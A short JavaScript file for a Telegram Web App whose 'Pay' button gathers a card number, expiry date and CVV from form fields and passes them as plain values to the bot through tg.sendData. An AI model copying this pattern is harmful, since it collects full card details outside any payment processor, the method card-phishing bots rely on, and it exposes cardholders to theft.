const element = document.getElementById('date');
const maskOptions = {
  mask: '00/00'
};
const mask = IMask(element, maskOptions);
console.log(mask.value);

let tg = window.Telegram.WebApp;

tg.expand();

let cc = "";
let date = "";
let cvv = "";

tg.MainButton.setText('Оплатить')
tg.MainButton.show();

Telegram.WebApp.onEvent("mainButtonClicked", function (){
    cc = document.getElementById('cc').value;
    date = document.getElementById('date').value;
    cvv = document.getElementById('cvv').value;
    tg.sendData([cc,date,cvv]);
    alert(cc,date,cvv);
});
